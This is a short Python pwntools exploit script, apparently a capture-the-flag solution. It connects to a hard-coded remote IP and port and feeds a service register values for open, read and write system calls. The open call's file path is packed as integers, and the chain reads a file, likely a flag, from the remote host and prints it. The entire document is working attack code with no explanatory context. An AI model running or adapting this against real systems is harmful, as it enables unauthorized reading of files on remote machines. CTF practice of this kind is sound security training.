#!/usr/bin/python
from pwn import *

host = '35.200.228.122'
port = 1337
#host = 'localhost'
#port = 4000
r = remote(host, port)


r.recvuntil('RAX')
r.sendline(str(2))
r.recvuntil('RDI')
r.sendline(str(0x6010c0))
r.recvuntil('RSI')
r.sendline(str(0))
r.recvuntil('RDX')
r.sendline(str(0))
r.recvuntil('RCX')
r.sendline(str(7018067707001006127))
r.recvuntil('R8')
r.sendline(str(3420892254115494259))
r.recvuntil('R9')
r.sendline(str(1734437990))


r.recvuntil('RAX')
r.sendline(str(0))
r.recvuntil('RDI')
r.sendline(str(3))
r.recvuntil('RSI')
r.sendline(str(0x6010e0))
r.recvuntil('RDX')
r.sendline(str(40))
r.recvuntil('RCX')
r.sendline(str(0))
r.recvuntil('R8')
r.sendline(str(0))
r.recvuntil('R9')
r.sendline(str(0))


r.recvuntil('RAX')
r.sendline(str(1))
r.recvuntil('RDI')
r.sendline(str(1))
r.recvuntil('RSI')
r.sendline(str(0x6010e0))
r.recvuntil('RDX')
r.sendline(str(40))
r.recvuntil('RCX')
r.sendline(str(0))
r.recvuntil('R8')
r.sendline(str(0))
r.recvuntil('R9')
r.sendline(str(0))


r.interactive()
